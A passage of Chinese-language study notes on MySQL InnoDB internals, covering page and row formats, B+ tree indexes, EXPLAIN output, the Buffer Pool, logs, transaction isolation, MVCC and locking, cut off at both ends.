Space\n空闲空间\n不确定\n页中尚未使用的空间\n\n\nPage Directory\n页目录\n不确定\n页中某些记录的相对位置\n\n\nFile Trailer\n文件尾部\n8字节\n校验页是否完整\n\n\n其中，File Header是所有类型的页都使用的头部，Page Header是专门为数据页用的。\n因为存在数据刷新一般还没有结束的时候断电的可能，所以为了便于检测一个页是否完整，InnoDB在每个页的尾部添加了一个File Trailer部分。\nFile Trailer的前四个字节代表页的校验和，File Header中也有页的校验和，没有发生异常的情况下，两个校验和应该相等。如果发生了数据还没刷新完（假设File Header已经先被刷新到磁盘）就断电，则如果校验File Trailer和File Header或发现两者的校验和不一致，则说明刷新期间出错。\n\n记录记录格式数据库表中的每条数据可以被称为行或记录，InnoDB支持4种不同类型的行格式，分别是COMPACT、REDUNDANT、DYNAMIC、COMPRESSED。\n指定行格式的语法：\n(CREATE TABLE 表名 (列的信息))|(ALTER TABLE 表名 ROW_FORMAT) ROW_FORMAT=行格式;\n\nCOMPACT行格式：\n一条完整的记录包含：变长字段长度列表、NULL值列表、记录头信息、记录的数据。\n变长字段长度列表、NULL值列表中的信息都是逆序存放。\n记录的数据中除了自定义的列数据外，MySQL还会为每个记录添加一些列（也称隐藏列），如ROW_ID, TRX_ID, ROLL_POINTER。InnoDB的主键生成策略是，优先使用用户自定义的主键，如果没有定义，则选用一个不存储NULL值的UNIQUE键作为主键，如果都没有，则为表添加一个名为如ROW_ID的隐藏列作为主键。 \n变长字段长度列表的每个字段长度的字节数根据变长字段的长度不同，可能是1字节也可能是2个字节（当变长字段长度的首位为0时表示当前长度是2字节，当首位为1表示当前是1字节），长度规则（M：字符的最大长度；W：字符集中字符的最大字节数；L：实际的字符串占用的字节长度）是：\n\n如果M * W &lt;&#x3D; 255，则使用1个字节表示真实的数据占用字节数。\n如果M * W &gt; 255，则又分两种情况：\n如果L &lt;&#x3D; 127，则使用1字节表示真实数据占用的字节数。\n如果L &gt; 127，则使用2字节表示真实数据占用的字节数。\n\n\n\n其它行格式：\nREDUNDANT的MySQL5.0版本之前的一种行格式。\nDYNAMIC是MySQL5.7版本引入的，是MySQL5.7默认行格式。\nCOMPRESSED行格式会采用压缩算法对页面进行压缩。\n除REDUNDANT是非紧凑的外，其它三种行格式都是紧凑的。\n记录溢出一个页的大小一般是16KB，也就是16384字节，而一个VARCHAR(M)类型的列就最多可以存储65533个字节，这样就可能出现一个页存放不了一条记录。在Compact和Reduntant行格式中，对于占用存储空间非常大的列，在记录的真实数据处只会存储该列的一部分数据，把剩余的数据分散存储在几个其他的页中，然后记录的真实数据处用20个字节存储指向这些页的地址(当然这20个字节中还包括这些分散在其他页面中的数据的占用的字节数），从而可以找到剩余数据所在的页。\nDynamic和Compressed行格式这两种行格式类似于COMPACT行格式，只不过在处理行溢出数据时有点儿分歧，它们不会在记录的真实数据处存储一部分数据，而是把所有的数据都存储到其他页面中，只在记录的真实数据处存储其他页面的地址。另外，Compressed行格式会采用压缩算法对页面进行压缩。\n删除记录对于执行了删除操作的记录，并不是真正被删除，而是将deleted_flag设置为了1，所有被删除的记录会组成一个垃圾记录的链表，记录在这个链表中的空间称为可重用空间。之所以不真正删除，是因为移除字段需要重新排列其它记录，会消耗性能，之后如果有新记录插入到表中，它们就会覆盖掉被删除的记录占用的存储空间。\n查找指定主键值的记录查找指定主键值的记录的过程是，首先使用二分法在索引页的页目录中定位指定主键值的记录所在的数据页，然后依然使用二分法在数据页中定位指定主键值的记录。\n数据页数据页存在于B+树的叶子节点上，内部存储了表记录。\nB+树能够存储的记录数计算公式是：(M)^N * T。其中N是B+树的层数、M是每个页可以存储的目录页的数量、T是每个页可以存储的记录的数量。\n目录页（索引页）索引页中存储的记录是主键和页号指针，也会使用页目录，以能够支持使用二分查找。\n表空间、段、区、页之间的关系表空间（Tablespace）、段（Segment）、区（Extend）、页（Page）是InnoDB中数据存储中的概念。\n表空间和页的关系表空间和页的关系是，表空间文件由许多固定大小的页组成。有不同类型的页面可用于不同的目的，示意图如下：\n\n表空间、区、页的关系表空间、区、页的关系是，区是表空间内连续页的集合。区是大小为 1 MB。因此，如果页面大小为 16Kb，则一个区段中有 64 个页面，示意图如下：\n\n段、页、区的关系段是逻辑上的概念，是页面和区的集合，示意图如下：\n\n\nFRAG ARRAY（碎片页数组）\n分配给该段的页组成的数组（共32 个页）。\n\nNOT FULL LIST（未满的区链表）\n指向由未满的区（有至少一个空闲页的区，空闲页是未使用的数据页）组成的链表，即NOT FULL链表中的每个区都没有空闲页。\n\nFULL LIST（满的区链表）\n指向由满的区（没有空闲页的区）组成的链表，即FULL链表中的每个区都没有空闲页。\n\nFREE LIST（空闲区链表）\n指向由空闲区（每个页面都是空闲页的区）组成的链表，即FREE链表的所有页都是空闲页。\n\n\n段为索引段，数据段，回滚段等。其中索引段就是非叶子结点部分，而数据段就是叶子结点部分，回滚段用于数据的回滚和多版本控制。\n表的连接从本质上说，连接就是把各个表中的记录取出来进行匹配，并产生结果集，如果不加任何过滤条件，产生的结果集就是笛卡尔积。\n嵌套循环连接算法和基于块的嵌套循环连接算法\n嵌套循环连接算法（Nested-Loop Join Algorithm，简称NLJ Algorithm）的基本思想是，每次从循环中的第一个表中读取一行，将每一行传递给一个嵌套循环，该嵌套循环处理连接中的下一个表。只要有剩余的表要连接，这个过程就会重复多次。\n嵌套循环连接算法的原理示例：\n假设对三个表t1，t2和t3使用了连接，且连接类型分别如下所示：\nTable   Join Typet1      ranget2      reft3      ALL\n\n如果使用了嵌套循环连接算法，则连接过程如下所示：\nfor each row in t1 matching range &#123;  for each row in t2 matching reference key &#123;    for each row in t3 &#123;      if row satisfies join conditions, send to client    &#125;  &#125;&#125;\n\n因为嵌套循环连接算法每次只从外循环中向内循环传递一条记录，所以通常会多次读取在内循环中处理的表，可以为内循环表（被驱动表）建立合适的索引以加快查询速度。\n如果驱动表的结果集中记录较多，导致读取被驱动表的次数很多，可以使用基于块的嵌套循环连接算法（Block Nested-Loop Join Algorithm，简称BNLJ Algorithm），该算法对外循环表（驱动表）中读取的行的进行缓存来减少必须读取内循环表的次数。例如，如果将驱动表的结果集中的N行读取到缓冲器中，并且将缓冲器传递到下一个内循环，则可以将内循环中读取的每一行与缓冲器中的所有N行进行比较。这将使必须读取内部表的次数减少N倍。\nB+树索引B树\nB-Tree·叶节点具有相同的深度，叶节点的指针为空·所有索引元素不重复·节点中的数据索引从左到右递增排列\nB+Tree(B-Tree变种)非叶子节点不存储data，\n只存储索引(冗余),可以放更多的索引叶子节点包含所有索引字段叶子节点用指针连接，提高区间访问的性能\nInnoDB中的索引方案B+树索引的类型B+树索引可以分为聚簇索引（也称聚集索引，clustered index）、辅助索引（有时也称非聚簇索引或二级索引，secondary index，non-clustered index），和联合索引（也称复合索引、多列索引）。\n\n聚簇索引\n\n使用记录的主键值大小进行记录和页的排序\n叶子节点存储的是完整的用户记录\n\n具有以上两个特点的B+树称为聚簇索引。\n\n二级索引\n聚簇索引只能在搜索条件是主键时生效，原因是聚簇索引中的数据都是按照主键进行排序的。如果要以其它列为搜索条件，就需要额外建立二级索引。\n\n使用其它非主键（此处称之为，被排序列）的大小进行记录和页的排序\n叶子节点存储的不是完整的用户记录，只是被排序列+主键两个列的值\n目录页中的记录不再是主键+页号，而是被排序列+主键（保证目录页记录是唯一的）+页号\n\n具有以上三个特点的B+树称为二级索引。\n如果需要其它（除索引和主键外的）列信息，需要执行回表操作。\n\n联合索引\n也可以同时以多个列的大小作为排序规则，也就是同时为多个列建立索引。\n\n使用多个列（此处称之为，被排序的列，存在先后顺序）的大小进行记录和页的排序\n同二级索引\n同二级索引\n\n具有以上三个特点的B+树称为联合索引。\n\n\nB树和B+树之间的主要区别B树结构如下图：\n\nB+树结构如下图：\n\n\n结构：B树和B+树的结构略有不同。B树中的每个节点包含索引和对应的数据，而B+树中的非叶子节点只包含索引，而数据存储在叶子节点中。B+树的叶子节点之间通过链表连接，形成了一个有序的数据链表。\n范围查询：由于B+树的叶子节点之间通过链表连接，可以方便地进行范围查询。而在B树中，由于数据分散在各个节点中，范围查询需要在树的不同层级进行搜索和合并，相对较慢。\n插入和删除操作：在B+树中，由于数据只存在于叶子节点中，插入和删除操作只需要修改叶子节点，而在B树中，插入和删除可能需要修改多个节点。因此，B+树相对于B树来说，插入和删除操作更加高效。\n\nHash索引和B+树索引的区别\n对索引的key进行一次hash计算就可以定位出数据存储的位置很多时候Hash索引要比B+树索引更高效。\nHash索引仅能支持“&#x3D;”，“IN”操作，不支持范围查询hash冲突问题。\n\n索引的作用\n对于满足索引使用条件的语句，可以起到加速查询的作用。\n如果ORDER BY子句中使用了索引列，且满足索引的使用条件（排序顺序和索引列的顺序一致，索引列左边的连续的列为常量就可以对右边的列进行排序，等），就会省去在内存或磁盘中（文件排序，filesort）建立临时表进行排序的操作。\n如果GROUP BY子句中使用了索引列，且满足索引的使用条件，就可以直接使用索引进行分组，省去在内存或磁盘中建立临时表进行分组的操作。\n\n索引的代价\n创建索引需要消耗存储空间。\n每当对表中的数据进行增删改操作时，都需要修改各个B+树的索引，存在时间代价。\n生成执行计划时需要计算使用不同索引执行查询所需的成本，最后选择成本最低的那个索引执行查询，如果索引过多，可能会导致成本分析时间加长。\n\n索引的正确、高效的使用方式\n只为用于搜索、排序或分组的列创建索引：因为索引只在搜索、排序或分组三种操作下才发挥作用，所以只需要为这三种操作涉及到的列建立索引。\n避免对重复值占比高的字段建立索引：考虑索引列中重复值的个数占比，如果重复值太多，则需要大量的回表操作，不适合使用索引。\n索引列的类型占用的存储空间尽量小：因为索引占用的存储空间越小，在一个数据页内就可以存放更多的记录，磁盘I&#x2F;O带来的性能消耗也就越小。可以为列前缀建立索引，如果需要建立的索引类型需要很大的存储空间，则可以只对该类型的列的前几个字符建立索引。语法是在建立索引时，在建立索引的列后使用括号指定建立的索引的字符的长度。\n避免回表：尽量使用覆盖索引（covering index ，又称索引覆盖），即在查询时尽量使需要返回的内容最多只包含索引和主键，以避免回表，从而提高查询速度。\n让索引列以列名的形式在搜索条件中单独出现：例如对于SELECT id FROM table_name WHERE index_column_name * 2 &lt; 4 ;和SELECT id FROM table_name WHERE index_column_name &lt; 4 / 2;，这两个语句中，前一个语句不能使用索引，但是后一个可以。这个是因为在前一个查询语句中，index_column_name列不是单独以列名的形式出现的，而是以列名*2的表达式的形式出现的，MySQL会直接认为这个搜索条件不能使用索引。\n在新插入记录时尽量让记录的主键递增：如果新插入记录的主键是依次递增的话，则每插入一个数据页就会换到下一个数据页继续插入；如果新插入的记录的主键值忽大忽小，就会增大页面分裂的概率，在页面分裂时需要将页中的一些记录移动到新创建的页中，带来性能损耗。\n\n建立合适的索引查询的成本MySQL中查询语句的执行成本由两个方面组成，I&#x2F;O成本和CPU成本：\n\nI&#x2F;O成本：InnoDB存储引擎是将数据页存储在磁盘上，当查询表中的记录时，需要先把数据页加载到内存中，这个过程中消耗的时间称为I&#x2F;O成本。\nCPU成本：检测记录是否满足对应的搜索条件、对结果集进行排序等操作消耗的时间称为CPU成本。\n\n单表查询的成本\n在对单表查询生成执行计划前，MySQL的优化器会找出并对比不同的执行方案，从而找出成本最低的执行方案，这一过程的具体步骤是：\n\n根据搜索条件，找出所有可能使用的索引。\n计算全表扫描的执行成本。\n计算使用不同索引执行查询的执行成本。\n对比不同执行方案的执行成本，找出成本最低的那个方案。\n\n多表查询的成本\n性能调优调优可以提高数据库的性能和吞吐量。以下是一些MySQL调优的方法：\n\n优化查询语句\n\n使用合适的索引：对于经常用于检索的列，创建索引可大幅提升查询效率；\n\n避免使用SELECT ：只选取必要的列可以减少数据传输和磁盘I&#x2F;O；\n\n使用EXPLAIN命令查看查询执行计划：通过观察查询计划，可以了解到查询过程中哪些步骤需要优化。\n\n\n\n调整服务器参数\n\n修改MySQL缓冲区大小：将innodb_buffer_pool_size设置为合理的大小，以便在缓存中保留更多的数据；\n\n调整处理器缓存和线程池：根据服务器的硬件规格和应用程序类型，适当增加线程池大小和处理器缓存大小，以提高并发处理能力；\n\n修改文件系统缓存大小：根据服务器的硬件和操作系统，可以修改磁盘缓存大小；\n\n\n\n优化表结构设计\n\n使用恰当的数据类型：为每个列选择最小、最合适的数据类型可以减少磁盘空间和内存开销，提高查询速度；\n\n避免使用太多的JOIN：JOIN操作需要较多的CPU和内存资源，应尽可能减少其使用；\n\n分解大的表：当一个表中包含大量数据时，可以考虑将其分解为多个较小的表，以提高查询和更新效率。\n\n\n\n监控数据库性能\n\n使用SHOW STATUS或SHOW GLOBAL STATUS命令查看MySQL性能统计信息；\n\n采用监控工具进行实时监控，如Nagios、Zabbix等。\n\n\n\n\n总而言之，在调优MySQL时需要综合考虑硬件、操作系统、数据库参数等各方面因素，对于常见的优化点进行一一梳理和测试，以找到最佳配置参数。\nInnoDB对查询的自动优化查询优化器会对查询进行自动的优化，优化方法如下：\n\n条件简化\n\n移除不必要的括号\n常量传递\n替换永远为TRUE或FALSE条件\n表达式计算\n合并没有使用聚合函数及GROUP BY子句的SQL语句中的HAVING和WHERE子句\n常量表检测，此处的常量表指的是表中没有或者只有一条记录、使用主键或唯一二级索引进行等值匹配作为搜素条件，因为这两种查询花费的时间很小，所以把通过这两种查询方式查询的表称为常量表（constant table）\n\n\n外连接消除\n\n在空值拒绝的条件下外连接可以转换为内连接，通过将外连接转换为内连接，就可以使用内连接的执行优化方法。空值拒绝（reject-NULL）指的是，在外连接查询中，WHERE子句中包含被驱动表中的列不为NULL值的条件。\n\n\nIN子查询优化\n\n对可以转化为内连接的查询的IN子查询的结果建立物化表，并使用内连接的执行优化方案。\n物化表：对子查询的结果集建立基于内存临时表+哈希索引，或基于磁盘的临时表+B+树索引，此处的临时表被称为物化表，数据添加到物化表中时一般会去重。如果子查询的结果集过大导致超过了系统变量tmp_table_size或者max_heap_table_size的值，则基于内存的临时表会转换为基于磁盘的临时表，并转换索引类型。\n\n如果IN子查询符合转换为半连接（SEMI JOIN）的条件，会将该子查询转换为半连接。\n转换方法包括以下几种：\n\n子查询中的表上拉（Table pullout）\n当子查询的查询列表中有主键或者唯一索引列的查询条件时，可以直接把子查询中的表上拉到外层查询的FROM子句中\n\n松散扫描（LooseScan）\n如果搜索条件中的某一列建立了索引，并且能够使用索引，那么只需要对该列的多个同样的值执行一次匹配即可。\n\n……\n\n\n两种IN子查询优化方法的使用顺序是，优先使用转换为半连接的方法，如果IN子查询不符合转换为半连接的条件，才会使用将IN子查询物化的方法。\n\n\n\n\nEXPLAIN使用EXPLAIN能够输出语句的执行信息，使用方法是在查询语句前加EXPLAIN关键字。\nEXPLAIN输出格式在MySQL中，可以使用EXPLAIN关键字来分析SQL语句的执行计划，EXPLAIN会返回一张表格，其中包含了关于MySQL如何处理SQL语句的信息，例如表的读取顺序、使用的索引名及类型、是否需要临时表等等。通过检查这些信息，可以找到潜在的性能问题，并针对性地进行调整，从而优化查询性能。\n如果查询语句（包括子查询语句）有多条，或在一个查询语句中使用了多张表，或执行计划中使用了临时表，EXPLAIN的输出结果就会有多条，在EXPLAIN输出的多行结果中，不同的id代表不同的查询语句，相同的id代表相同查询语句的不同表，id为NULL时代表临时表。\nEXPLAIN语法如下：\nEXPLAIN SELECT * FROM table_name WHERE condition;\n\n\n\n\nColumn\nJSON Name\nMeaning\n解释\n\n\n\nid\nselect_id\nThe SELECT identifier\n标识符\n\n\nselect_type\nNone\nThe SELECT type\n查询类型\n\n\ntable\ntable_name\nThe table for the output row\n表名\n\n\npartitions\npartitions\nThe matching partitions\n匹配的分区\n\n\ntype\naccess_type\nThe join type\n访问方法\n\n\npossible_keys\npossible_keys\nThe possible indexes to choose\n可能用到的索引\n\n\nkey\nkey\nThe index actually chosen\n实际用到的索引\n\n\nkey_len\nkey_length\nThe length of the chosen key\n索引的长度\n\n\nref\nref\nThe columns compared to the index\n与索引进行等值匹配的列信息\n\n\nrows\nrows\nEstimate of rows to be examined\n预计需要读取的记录条数\n\n\nfiltered\nfiltered\nPercentage of rows filtered by table condition\n经过搜索条件过滤后剩余记录条数占rows数量的百分比\n\n\nExtra\nNone\nAdditional information\n一些额外的信息\n\n\n查询类型\n\n\nselect_type Value\nMeaning\n解释\n\n\n\nSIMPLE\nSimple SELECT (not using UNION or subqueries)\n查询语句中不包含UNION、UNION  ALL或子查询的查询都算是SIMPLE类型。\n\n\nPRIMARY\nOutermost SELECT\n对于包含UNION、UNION  ALL或者子查询的查询来说，最左边的查询的查询类型就是PRIMARY。\n\n\nUNION\nSecond or later SELECT statement in a UNION\n对于包含UNION或者UNION  ALL的查询来说，除最左边的查询之外的子查询的查询类型都是UNION。\n\n\nUNION RESULT\nResult of a UNION.\n对于包含UNION的查询来说，被用来做去重的临时表的查询类型就是UNION RESULT。\n\n\nDEPENDENT UNION\nSecond or later SELECT statement in a UNION, dependent on outer query\n是使用了UNION或UNION  ALL，且依赖外部查询中的数据来执行其操作的子查询。\n\n\nSUBQUERY\nFirst SELECT in subquery\n提示了子查询语句是否使用半连接转换以及允许使用哪些半连接策略，以及在不使用半连接时，是否使用子查询物化或IN到EXISTS转换。格式见官网。\n\n\nDEPENDENT SUBQUERY\nFirst SELECT in subquery, dependent on outer query\n是依赖外部查询中的数据来执行其操作的子查询。\n\n\nDERIVED\nDerived table\n派生表，是指在查询语句中使用子查询生成的临时表。\n\n\nDEPENDENT DERIVED\nDerived table dependent on another table\n依赖外部查询中的数据来执行其操作的派生表。\n\n\nMATERIALIZED\nMaterialized subquery\n物化表。\n\n\nUNCACHEABLE SUBQUERY\nA subquery for which the result cannot be cached and must be re-evaluated for each row of the outer query\n不能缓存其结果的子查询，必须对外部查询的每条记录重新查询。\n\n\nUNCACHEABLE UNION\nThe second or later select in a UNION that belongs to an uncacheable subquery (see UNCACHEABLE SUBQUERY)\n使用了UNION或UNION  ALL，且不能缓存其结果的子查询，必须对外部查询的每条记录重新查询。\n\n\n访问方法\n\n\n访问方法名\n常见的搜索条件\n解释\n\n\n\nconst\nUtilize PRIMARY KEY or UNIQUE index to constant values using the = operator.\n主键或唯一索引列与常数进行等值比较。\n\n\nref\nThe comparison value can be either a constant or an expression that utilizes the PRIMARY KEY or UNIQUE index when using the = or &lt;=&gt; operator.\n使用主键和唯一索引列进行等值比较或&lt;&#x3D;&gt;比较\n\n\neq_ref\nThe comparison value can be either a constant or an expression that utilizes the PRIMARY KEY or UNIQUE NOT NULL index when using the = operator.\n使用主键和唯一非NULL索引列进行等值比较或表达式比较\n\n\nref_or_null\nThis join type is like ref, but with the addition that MySQL does an extra search for rows that contain NULL values.\n类似ref，但多了一个或IS NULL的比较\n\n\nrange\nrange can be used when a key column is compared to a constant using any of the =, &lt;&gt;, &gt;, &gt;=, &lt;, &lt;=, IS NULL, &lt;=&gt;, BETWEEN, LIKE, or IN() operators\n当使用任何&#x3D;、&lt;&gt;、&gt;、&gt;&#x3D;、&lt;、&lt;&#x3D;、is NULL、&lt;&#x3D;&gt;、BETWEEN、LIKE或IN()运算符将键列与常量进行比较时，可以使用范围\n\n\nindex\nThe index join type is the same as ALL, except that the index tree is scanned.\nindex扫描方法是扫描全部二级索引记录的访问方法。一般是在索引包含搜索条件和完整的返回结果的情况下使用，因为这种情况下扫描全部二级索引比扫描全部聚簇索引的耗时小。\n\n\n\nThis type replaces eq_ref for some IN subqueries.\n替换IN子查询下的eq_ref\n\n\nindex_subquery\nThis join type is similar to unique_subquery. It replaces IN subqueries, but it works for nonunique indexes in subqueries.\n类似unique_subquery，不同的是索引不是非唯一的\n\n\nfulltext\nThe join is performed using a FULLTEXT index.\n使用全文索引\n\n\nindex_merge\nThis join type indicates that the Index Merge optimization is used.\n表示使用了索引合并\n\n\nall\nA full table scan is done for each combination of rows from the previous tables.\n使用了全表扫描。\n\n\n索引合并分三种：\n\nIntersection\nIntersection（交集）合并方式的应用示例：\nSELECT * FROM table_name WHERE column_name1 = &#x27;a&#x27; AND column_name2 = &#x27;b&#x27;;\n\n其中column_name1和column_name2列都已建立索引。使用Intersection合并方式意味着使用column_name1和column_name2进行查询，得到有序的主键，再取交集，对交集中的主键执行回表操作。取交集的好处是，避免了对不满足条件的主键值执行回表操作。\n使用Intersection的条件是，从每个索引中获取到的二级索引的主键值是有序的。\n索引得到的主键值是有序的有两个好处：\n\n从两个有序集合中取交集比从两个无序集合中取交集要容易；\n如果主键值是有序的，则根据这些主键值执行回表操作时就不再是进行单纯的随机I&#x2F;O，从而提高效率。\n\n\nUnion\nUnion（并集）合并方式的应用示例：\nSELECT * FROM table_name WHERE column_name1 = &#x27;a&#x27; OR column_name2 = &#x27;b&#x27;;\n\n其中column_name1和column_name2列都已建立索引。使用Union合并方式意味着使用column_name1和column_name2进行查询，得到有序的主键，再取并集，对并集中的主键执行回表操作。取并集的好处是，避免了对满足条件的主键值重复执行回表操作。\n使用Union的条件是，从每个索引中获取到的二级索引的主键值是有序的。\n索引得到的主键值是有序的有两个好处：\n\n对两个有序集合中去重比对两个无序集合中去重要容易；\n同index_merge。\n\n\nSort-Union\nSort-Union（排序后取并集）合并方式比Union多了一个对二级索引记录的主键值排序的操作。\n\n\nkey_len的计算\n对于固定长度的类型来说，key_len就是就是数据类型的字节长度，如INT类型的索引的key_len的基础值是4。\n对于变长的类型来说，是类型定义的最长长度乘以字符类型长度，如使用了utf8mb4的类型为VARCHAR(100)的列key_len的基础值是4*100&#x3D;400。\n\n之所以称为是key_len的基础值，是因为在部分情况下key_len会在基础值上加几个字节：\n\n对于可以存储NULL值的索引列，会在key_len的基础值上加1个字节。\n对于变长类型，会在key_len的基础值上加2个字节。\n\nref当访问方法是const、eq_ref、ref、ref_or_null、unique_subquery、index_subquery中的一个时，ref展示的就是与索引进行等值匹配的列信息。如果不是这些访问方法中的一个，则ref显示NULL。\nJSON格式的执行计划EXPLAIN输出的信息中没有执行计划的成本，通过在EXPLAIN和查询语句之间添加FORMAT=JSON可以实现输出包含成本的执行计划。\nSHOW WARNINGS在使用EXPLAIN语句查看了某个查询的执行计划之后，紧接着还可以使用SHOW WARNINGS语句来查看查询的执行计划的扩展信息，其中包含查询优化器将查询语句重写后的语句，只是该语句不是标准的查询语句。\noptimizer trace如果打开optimizer trace功能，则执行查询语句，或使用EXPLAIN查看查询语句的执行计划后，就会在information_schema数据库下的OPTIMIZER_TRACE来查看完整的执行计划生成和执行的过程。optimizer trace输出的信息大致包含将优化过程分为了三个阶段，perpare阶段、optimize阶段、execute阶段。基于成本的优化集中在optimize阶段，对于单表查询来说，主要关注optimize阶段的rows_estimation过程，该过程写明了对各种不同的执行方案对应的成本；对于多表查询来说，主要关注optimize阶段的considered_execution_plans过程，该过程写明了各种不同的表连接顺序对应的成本。\nBuffer Pool缓冲页Buffer Pool是MySQL向操作系统申请的在内存中的一块内存区域，可以通过启动选项buffer_pool_size进行配置（单位是字节），默认大小是128MB。\nBuffer Pool中的内存区域以页面为单位进行划分，页面大小和InnoDB表空间中使用的页面大小一致，默认都是16KB，Buffer Pool中的页称为缓冲页，每个缓冲页都有一个对应的控制块，存储了缓冲页的一些信息，如缓冲页的地址、表空间、页号。\n缓冲页哈希InnoDB中定位到指定表空间和页号的缓冲页所在的位置的实现方法是，以表空间+页号作为key，以缓冲页的控制块作为value，就可以通过先定位到控制块（如果内存中已经有缓冲页的话），然后再由控制块的缓冲页的地址信息定位到缓冲页。\n常见的链表类型及其管理方式\nfree链表\nfree链表（空闲链表）是存放所有空闲的缓冲页对应的控制块的链表。\nfree链表有一个对应的基节点，里面包含了链表的头节点地址、尾节点地址，以及链表中节点的数量等信息。\n\nflush链表\nflush链表是存放了脏页（dirty page，被修改过的缓冲页）对应的控制块的链表。\n\nLRU链表\nLRU（Least Recently Used）链表管理了非空闲的缓冲页，当Buffer Pool中不再有空闲的缓冲页时，就会淘汰掉最近很少使用的部分缓冲页。\nInnoDB中的LRU链表是按照一定比例分成两截的：一部分存储使用频率非常高的缓冲页，这一部分链表也被称为热数据，或者young区域；另一部分存储使用频率不高的缓冲页，这一部分链表也被称为冷数据，或者old区域。对于old区域，如果访问的间隔时间大于系统变量innodb_old_blocks_time的设定值就会被移动到young区域。\n\n\n日志Redo LogRedo Log（重做日志，Redo日志）是记录了已提交事务对数据库的修改的日志。\nRedo日志的用途：事务在提交前，需要将相关修改操作记录到redo日志中的，系统因崩溃而重启时需要按照redo日志重新更新数据页。\n之所以先写入Redo Log磁盘而不是将数据直接写入ibd磁盘，是因为写Redo Log是顺序写，而数据写入ibd磁盘是随机写。\nUndo LogUndo Log（撤销日志，Undo日志）是记录了数据库中的数据被修改前的状态的日志。\nUndo日志的用途：用于保证事务的原子性，如果事务在执行过程中被取消，就将数据库依照undo日志恢复到原来的状态，这个操作叫做回滚。\nBinary LogBinary Log（二进制日志），也称为binlog，\nbinlog的用途：\n\n主从复制：数据库源服务器上将binlog发送给数据库副本服务器（下文简称副本），副本通过执行binlog复制源服务器上的数据。\n数据备份和恢复：通过创建binlog对数据进行备份，在需要的时候通过执行binlog恢复备份。\n\n事务概念事务的4个特性（ACID，acid（辅助记忆）：酸）：\n\n原子性（Atomic）：要么全做，要么全不做\n隔离性（Isolation）：不同事务之间不会互相影响\n一致性（Consistency）：满足一致性需求，如转账前后总金额不变\n持久性（Durability）：事务的执行结果能够得到永久的保留（存储到了磁盘上）\n\n状态MySQL中根据操作的阶段把事务分为了以下几种状态：\n\n活动的（active）：事务正在执行。\n部分提交的（partially committed）：事务操作执行完成，但是执行结果尚保留在内存中，还没有进行持久化。\n失败的（failed）：事务在活动的和部分提交的两种状态下遇到了错误，并且无法继续执行或回滚。\n中止的（aborted）：事务在执行到中途遇到了错误，并且执行了回滚操作。\n提交的（committed）：如果事务处于部分提交状态，并且持久化成功。\n\n隔离问题\n脏写（Dirty Write）：如果一个事务修改了另一个未提交的事务修改过的数据，就意味着发生了脏写（写写）。\n脏读（Dirty Read）：读取到是数值是其它事务还未提交的值。\n不可重复读（No-Repeatable Read）：在一个事务中重读读取，会出现读取到的数值不一致的情况。\n幻读（Phantom）：如果一个事务先根据某些搜索条件查询出一些记录，在事务未提交时，另一个事务写入了一些数据导致符合搜索条件的记录发生变化，就意味着发生了幻读（读写）。\n\n隔离级别对四种隔离问题按照导致的一致性问题的严重性排序：脏写&gt;脏读&gt;不可重复读&gt;幻读。\nSQL标准中有针对这四种隔离问题的四种隔离级别（都能避免脏写）：\n\nREAD UNCOMMITED（未提交读）：隔离级别最低，不能避免脏读、不可重复读、幻读。\nREAD COMMITED（已提交读）：不能避免不可重复读和幻读。\nREPEATABLE READ（可重复读）：不能避免幻读。\nSERIALIZABLE（可串行化）：隔离级别最高，四种隔离问题都能避免。\n\nMySQL支持这四种隔离级别，默认的隔离级别是REPEATABLE READ。\nMVCC版本链是由记录的roll_pointer隐藏列连接（指向之前版本的记录）而成的记录链，记录中的另一个隐藏列trx_id就是记录的版本。\nMVCC（Multi-Version Concurrency Control，多版本并发控制）是利用记录的版本链来控制并发事务访问相同记录时的行为。\nInnoDB中使用MVCC实现读已提交和可重复读两种隔离级别，读已提交是操作版本链中最新的数据，可重复读是操作事务对应（绑定）的版本中的数据。\n在允许读取记录的旧版本的情况下，读写和写读操作可以使用MVCC。\nReadView（一致性视图）用于判断版本链中哪些版本是当前事务可见的（是否可以使用），ReadView包含4个重要的内容：\n\nm_ids：在生成ReadView时，当前系统中活跃的事务的事务id列表。\nmin_trx_id：在生成ReadView时，当前事务中活跃的事务中最小的事务id，即m_ids列表中的最小值。\nmax_trx_id：在生成ReadView时，下一个事务应该被分配的事务id（按照自增的规则生成事务id）。\ncreator_trx_id：生成ReadView的事务的事务id。\n\n使用ReadView并根据下列规则，判断当前事务是否可以使用某个版本的记录：\n\n如果被访问的记录的版本（trx_id值）等于ReadView中的creator_trx_id值，意味着当前事务访问自己修改过的记录，所以当前事务可以访问该版本的记录。\n如果被访问的记录的版本小于ReadView中的min_trx_id值，意味着生成该版本记录的事务已经提交，所以当前事务可以访问该版本的记录。\n如果被访问的记录的版本大于ReadView中的max_trx_id值，意味着生成该版本记录的事务还未提交，所以当前事务不能访问该版本的记录。\n如果被访问的记录的版本介于min_trx_id和max_trx_id之间，则需要判断记录的版本trx_id值，是否在m_ids列表中。如果在，说明生成该版本记录的事务还未提交，则当前事务不能访问该版本的记录；如果不在，说明生成该版本记录的事务已经提交，则当前事务可以访问该版本的记录。\n\n二级索引与MVCC：只有在聚簇索引记录中才有trx_id和roll_pointer隐藏列，如果查询语句是使用二级索引来执行查询，则判断可见性的方法是，首先跟二级索引页面的PAGE_MAX_TRX_ID（位于Page Header中，该参数记录了二级索引页面中的最大事务id）进行比较，如果当前事务id大于PAGE_MAX_TRX_ID，说明该页面中的所有记录都对当前事务可见，否则就需要执行回表，得到聚簇索引的记录之后再根据前述ReadView的判断规则判断是否可见。\n锁锁的应用事务串行化隔离级别的实现方式就是加锁。\n锁的类别MySQL中的锁分共享锁（Shared Lock，S锁）和独占锁（Exclusive Lock，X锁）。\n加锁的语句\n对读取的记录加S锁\n在SELECT语句后面加上LOCK IN SHARE MODE：\nSELECT ... LOCK IN SHARE MODE;\n\n对读取的记录加X锁\n在SELECT语句后面加上FOR UPDATE：\nSELECT ... FOR UPDATE;\n\n写锁的原理\nDELETE：\n定位到记录的位置后，获取记录的X锁，最后执行删除操作（包括delete mark和添加到垃圾链表等操作）。\n\nUPDATE：\n\n如果未修改记录的主键，且被更新的列占用的存储空间在修改前后未发生变化，则获取记录的X锁后直接在原记录的位置进行修改。\n否则，先对原记录执行删除原记录（DELETE操作）和插入新纪录（INSERT操作）的操作。\n\n\nINSERT\n插入新记录。\n\n\n行锁的类型\nRecord Lock：只给记录加锁\nGap Lock：给记录前面的间隙加锁\nNext-Key Lock：给记录和记录前面的间隙加锁，相当于Record Lock和Gap Lock的结合\nInsert Intention 